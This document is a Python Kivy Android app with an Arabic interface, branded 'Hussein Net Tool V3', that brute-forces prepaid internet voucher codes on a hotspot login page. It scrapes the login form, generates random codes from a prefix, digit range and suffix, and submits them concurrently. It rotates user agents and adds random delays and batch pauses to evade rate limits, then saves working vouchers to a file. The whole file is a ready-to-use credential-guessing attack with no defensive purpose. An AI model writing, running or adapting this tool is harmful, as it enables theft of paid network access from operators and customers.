# -*- coding: utf-8 -*-
"""
Hussein Tool - Android App
"""
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
from kivy.utils import get_color_from_hex

import threading
import asyncio
import random
import sqlite3
import time
import os
from datetime import datetime
from urllib.parse import urljoin

try:
    import aiohttp
    from bs4 import BeautifulSoup
except ImportError:
    pass


# ============================================================
#  Colors
# ============================================================
BG       = get_color_from_hex('#0a0e1a')
FG_CYAN  = get_color_from_hex('#00e5ff')
FG_PURP  = get_color_from_hex('#b388ff')
FG_PINK  = get_color_from_hex('#ff4081')
FG_GREEN = get_color_from_hex('#00e676')
FG_YELL  = get_color_from_hex('#ffd740')
FG_RED   = get_color_from_hex('#ff5252')
FG_WHITE = get_color_from_hex('#e0e0e0')
FG_DIM   = get_color_from_hex('#546e7a')


# ============================================================
#  Config
# ============================================================
DEFAULT_TARGET       = "http://t.net/index.html"
DEFAULT_PREFIX       = "31"
DEFAULT_SUFFIX       = "2"
DEFAULT_VAR_DIGITS   = 5
DEFAULT_MAX_ATTEMPTS = 100000

MAX_CONCURRENT       = 3
REQUEST_TIMEOUT      = 15
RETRY_ATTEMPTS       = 2
DELAY_MIN            = 0.3
DELAY_MAX            = 1.2
BATCH_SIZE           = 50
BATCH_REST           = 10

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/115.0",
]

SUCCESS_KW = ["status.html", "status", "success", "welcome", "logged in",
              "valid", "you are logged in", "remain_bytes_total",
              "session_time_left", "uptime"]
FAILURE_KW = ["login", "error", "failed", "invalid", "incorrect",
              "wrong", "popupError"]

OUTPUT_FILE = os.path.join(os.path.expanduser("~"), "valid_vouchers.txt")
DB_FILE     = os.path.join(os.path.expanduser("~"), "history.db")


# ============================================================
#  Database
# ============================================================
class Database:
    def __init__(self, db_path=DB_FILE):
        self.conn = sqlite3.connect(db_path)
        self.cursor = self.conn.cursor()
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS attempted (
                number TEXT PRIMARY KEY,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        self.conn.commit()

    def add(self, v):
        try:
            self.cursor.execute("INSERT OR IGNORE INTO attempted VALUES (?, CURRENT_TIMESTAMP)", (v,))
            self.conn.commit()
        except: pass

    def exists(self, v):
        self.cursor.execute("SELECT 1 FROM attempted WHERE number=?", (v,))
        return self.cursor.fetchone() is not None

    def count(self):
        self.cursor.execute("SELECT COUNT(*) FROM attempted")
        return self.cursor.fetchone()[0]

    def reset(self):
        self.cursor.execute("DELETE FROM attempted")
        self.conn.commit()

    def close(self):
        self.conn.close()


# ============================================================
#  Scanner (background worker)
# ============================================================
class Scanner:
    def __init__(self, url, prefix, suffix, digits, max_att, on_progress, on_found, on_finish):
        self.url = url.rstrip('/')
        self.prefix = prefix
        self.suffix = suffix
        self.digits = digits
        self.max_att = max_att
        self.on_progress = on_progress
        self.on_found = on_found
        self.on_finish = on_finish
        self.stop_flag = False
        self.total = 0
        self.errors = 0

    def stop(self):
        self.stop_flag = True

    def generate_voucher(self, db):
        max_val = 10 ** self.digits - 1
        if db.count() >= (max_val + 1):
            return None
        for _ in range(100):
            n = random.randint(0, max_val)
            v = self.prefix + str(n).zfill(self.digits) + self.suffix
            if not db.exists(v):
                db.add(v)
                return v
        return None

    async def fetch(self, session, method, url, **kw):
        for att in range(RETRY_ATTEMPTS):
            try:
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                async with session.request(method, url, ssl=False, headers=headers, **kw) as r:
                    if r.status >= 400:
                        raise Exception(f"HTTP {r.status}")
                    return r, await r.text()
            except Exception:
                if att == RETRY_ATTEMPTS - 1:
                    raise
                await asyncio.sleep(1)

    async def extract_login(self, session):
        try:
            r, html = await self.fetch(session, 'GET', self.url)
        except Exception as e:
            return None, {}

        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form')

        if not form:
            for a in soup.find_all('a', href=True):
                h = a['href']
                if 'login' in h.lower() or 'auth' in h.lower():
                    lu = urljoin(self.url, h)
                    try:
                        r2, h2 = await self.fetch(session, 'GET', lu)
                        s2 = BeautifulSoup(h2, 'html.parser')
                        form = s2.find('form')
                        if form:
                            action = form.get('action', '')
                            login_url = urljoin(lu, action) if action else lu
                            data = {}
                            for inp in form.find_all('input'):
                                n = inp.get('name')
                                if n:
                                    data[n] = inp.get('value', '')
                            return login_url, data
                    except: continue
                break

        if form:
            action = form.get('action', '')
            login_url = urljoin(self.url, action) if action else self.url
            data = {}
            for inp in form.find_all('input'):
                n = inp.get('name')
                if n:
                    data[n] = inp.get('value', '')
            return login_url, data

        return None, {}

    async def worker(self, session, login_url, template, queue, db):
        while not self.stop_flag:
            try:
                voucher = await asyncio.wait_for(queue.get(), timeout=0.5)
            except asyncio.TimeoutError:
                continue
            if voucher is None:
                break

            await asyncio.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
            self.total += 1

            if self.total >= self.max_att:
                self.stop_flag = True
                break

            if self.total % BATCH_SIZE == 0:
                await asyncio.sleep(BATCH_REST)

            data = dict(template)
            user_field = None
            for k in data.keys():
                kl = k.lower()
                if 'user' in kl or 'name' in kl or 'code' in kl or 'voucher' in kl:
                    user_field = k
                    break
            if user_field:
                data[user_field] = voucher
            else:
                data['username'] = voucher

            for k in data.keys():
                if 'pass' in k.lower():
                    data[k] = ''

            try:
                r, body = await self.fetch(session, 'POST', login_url, data=data)
                final_url = str(r.url).lower()
                bl = body.lower()

                success = any(kw in final_url or kw in bl for kw in SUCCESS_KW)
                if success:
                    if any(kw in final_url or kw in bl for kw in FAILURE_KW):
                        success = False

                if success:
                    with open(OUTPUT_FILE, 'a') as f:
                        f.write(f"[{datetime.now()}] {voucher} | {final_url}\n")
                    self.on_found(voucher)
                    self.stop_flag = True
                    return
            except Exception:
                self.errors += 1

            self.on_progress(self.total, self.errors, voucher)

    async def _run(self):
        db = Database()
        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            login_url, template = await self.extract_login(session)
            if not login_url:
                self.on_finish(None, "فشل استخراج رابط الدخول")
                db.close()
                return

            queue = asyncio.Queue(maxsize=MAX_CONCURRENT * 3)
            workers = [
                asyncio.create_task(self.worker(session, login_url, template, queue, db))
                for _ in range(MAX_CONCURRENT)
            ]

            attempts = 0
            while attempts < self.max_att and not self.stop_flag:
                v = self.generate_voucher(db)
                if v is None:
                    break
                await queue.put(v)
                attempts += 1
            await queue.put(None)

            await asyncio.gather(*workers, return_exceptions=True)

        db.close()
        self.on_finish(self.total, None)

    def start(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self._run())
        finally:
            loop.close()


# ============================================================
#  UI
# ============================================================
class HusseinUI(BoxLayout):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.orientation = 'vertical'
        self.padding = 20
        self.spacing = 10
        self.scanner = None

        with self.canvas.before:
            Color(*BG)
            self.bg_rect = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=self._upd_bg, size=self._upd_bg)

        # Title
        title = Label(
            text="[b]HUSSEIN[/b]\n[i]Net Tool V3[/i]",
            markup=True,
            font_size='40sp',
            color=FG_CYAN,
            size_hint_y=None,
            height=140,
        )
        self.add_widget(title)

        # Skull art
        skull = Label(
            text="    _.-=====-._\n"
                 "  .'           '.\n"
                 " /   .-------.   \\\n"
                 "|   /  (o)(o) \\   |\n"
                 "|  |     _     |  |\n"
                 "|  |    /_\\    |  |\n"
                 " \\  \\  |_|_|  /  /\n"
                 "  '.  '-----'  .'\n"
                 "    '-.....---'",
            font_size='11sp',
            color=FG_PURP,
            size_hint_y=None,
            height=160,
            halign='center',
        )
        self.add_widget(skull)

        # Inputs
        self.url_input = self._add_input("Target URL", DEFAULT_TARGET)
        self.prefix_input = self._add_input("Prefix", DEFAULT_PREFIX)
        self.suffix_input = self._add_input("Suffix", DEFAULT_SUFFIX)
        self.digits_input = self._add_input("Digits", str(DEFAULT_VAR_DIGITS))
        self.attempts_input = self._add_input("Max Attempts", str(DEFAULT_MAX_ATTEMPTS))

        # Status label
        self.status = Label(
            text="جاهز للبدء",
            font_size='16sp',
            color=FG_YELL,
            size_hint_y=None,
            height=60,
            markup=True,
        )
        self.add_widget(self.status)

        # Progress
        self.progress = Label(
            text="[ 0 / 100000 ]",
            font_size='14sp',
            color=FG_GREEN,
            size_hint_y=None,
            height=40,
        )
        self.add_widget(self.progress)

        # Buttons
        self.start_btn = Button(
            text=">  بدء الفحص",
            font_size='22sp',
            background_color=FG_GREEN,
            color=FG_WHITE,
            size_hint_y=None,
            height=70,
        )
        self.start_btn.bind(on_press=self.toggle_scan)
        self.add_widget(self.start_btn)

        view_btn = Button(
            text="عرض الكروت المحفوظة",
            font_size='16sp',
            background_color=FG_PURP,
            size_hint_y=None,
            height=50,
        )
        view_btn.bind(on_press=self.view_saved)
        self.add_widget(view_btn)

        reset_btn = Button(
            text="حذف السجل",
            font_size='16sp',
            background_color=FG_RED,
            size_hint_y=None,
            height=50,
        )
        reset_btn.bind(on_press=self.reset_hist)
        self.add_widget(reset_btn)

    def _upd_bg(self, *a):
        self.bg_rect.pos = self.pos
        self.bg_rect.size = self.size

    def _add_input(self, label, default):
        row = BoxLayout(orientation='horizontal', size_hint_y=None, height=50, spacing=5)
        lbl = Label(text=label, color=FG_DIM, size_hint_x=0.35, font_size='14sp')
        inp = TextInput(
            text=default,
            multiline=False,
            background_color=(0.05, 0.08, 0.15, 1),
            foreground_color=FG_CYAN,
            cursor_color=FG_CYAN,
            font_size='16sp',
        )
        row.add_widget(lbl)
        row.add_widget(inp)
        self.add_widget(row)
        return inp

    def toggle_scan(self, *a):
        if self.scanner:
            self.scanner.stop()
            self.scanner = None
            self.start_btn.text = ">  بدء الفحص"
            self.status.text = "تم الإيقاف"
            return

        try:
            url = self.url_input.text.strip() or DEFAULT_TARGET
            prefix = self.prefix_input.text.strip() or DEFAULT_PREFIX
            suffix = self.suffix_input.text.strip() or DEFAULT_SUFFIX
            digits = int(self.digits_input.text.strip() or DEFAULT_VAR_DIGITS)
            attempts = int(self.attempts_input.text.strip() or DEFAULT_MAX_ATTEMPTS)
        except ValueError:
            self.status.text = "قيم غير صحيحة"
            return

        self.start_btn.text = "إيقاف الفحص"
        self.status.text = "بدء الفحص..."

        def on_prog(total, errors, voucher):
            Clock.schedule_once(lambda dt: self._update_prog(total, errors, voucher), 0)

        def on_found(voucher):
            Clock.schedule_once(lambda dt: self._show_found(voucher), 0)

        def on_finish(total, error):
            Clock.schedule_once(lambda dt: self._finish(total, error), 0)

        self.scanner = Scanner(url, prefix, suffix, digits, attempts, on_prog, on_found, on_finish)

        t = threading.Thread(target=self.scanner.start, daemon=True)
        t.start()

    def _update_prog(self, total, errors, voucher):
        self.progress.text = f"[ {total} ] {voucher}   Err:{errors}"

    def _show_found(self, voucher):
        self.status.text = f"[b][color=00e676]تم إيجاد: {voucher}[/color][/b]"
        self.start_btn.text = ">  بدء الفحص"
        self.scanner = None
        popup = Popup(
            title="نجاح!",
            content=Label(text=f"الكرت: {voucher}", font_size='20sp', color=FG_GREEN),
            size_hint=(0.8, 0.3),
        )
        popup.open()

    def _finish(self, total, error):
        self.start_btn.text = ">  بدء الفحص"
        self.scanner = None
        if error:
            self.status.text = error
        else:
            self.status.text = f"انتهى. تم اختبار {total} كرت"

    def view_saved(self, *a):
        if not os.path.exists(OUTPUT_FILE):
            content = Label(text="لا توجد كروت محفوظة", color=FG_YELL)
        else:
            with open(OUTPUT_FILE) as f:
                lines = f.readlines()[-20:]
            text = "\n".join(l.strip() for l in lines) if lines else "لا توجد كروت"
            sv = ScrollView()
            lbl = Label(text=text, color=FG_CYAN, font_size='12sp',
                        size_hint_y=None, halign='left', valign='top')
            lbl.bind(width=lambda *x: lbl.setter('text_size')(lbl, (lbl.width, None)))
            lbl.bind(texture_size=lambda *x: setattr(lbl, 'height', lbl.texture_size[1]))
            sv.add_widget(lbl)
            content = sv

        popup = Popup(title="الكروت المحفوظة", content=content, size_hint=(0.9, 0.7))
        popup.open()

    def reset_hist(self, *a):
        db = Database()
        db.reset()
        db.close()
        self.status.text = "تم حذف السجل"


class HusseinApp(App):
    def build(self):
        self.title = "Hussein"
        Window.clearcolor = BG
        return HusseinUI()


if __name__ == '__main__':
    HusseinApp().run()
